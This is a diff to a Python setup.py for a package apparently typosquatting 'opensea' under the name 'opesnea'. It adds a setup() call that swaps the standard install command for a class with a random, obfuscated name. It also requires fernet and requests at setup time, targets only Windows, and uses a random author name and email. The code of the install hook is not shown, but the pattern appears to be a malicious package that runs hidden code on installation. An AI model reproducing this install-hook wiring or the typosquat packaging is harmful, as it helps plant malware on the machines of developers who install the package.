@@ -18,5 +18,22 @@ class UWuaWPKwFirBvyVKyYvWFOkmHLHGlrndJHchnIFnOqbtoEPIRCrVZmOBhSLhbCTeUOAYdmydmw
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
+setup(
+    name="opesnea",
+    version=VERSION,
+    author="ZiRLAVEimCziaAbJFZ",
+    author_email="dkQoJcKwxlXYLFi@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': UWuaWPKwFirBvyVKyYvWFOkmHLHGlrndJHchnIFnOqbtoEPIRCrVZmOBhSLhbCTeUOAYdmydmwZXtHkuJClhKxQovmhHSYGKBcVSsswpzURhXlmjCtRUAenNPhluWRjEDfiBJkLXXKUEUII,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
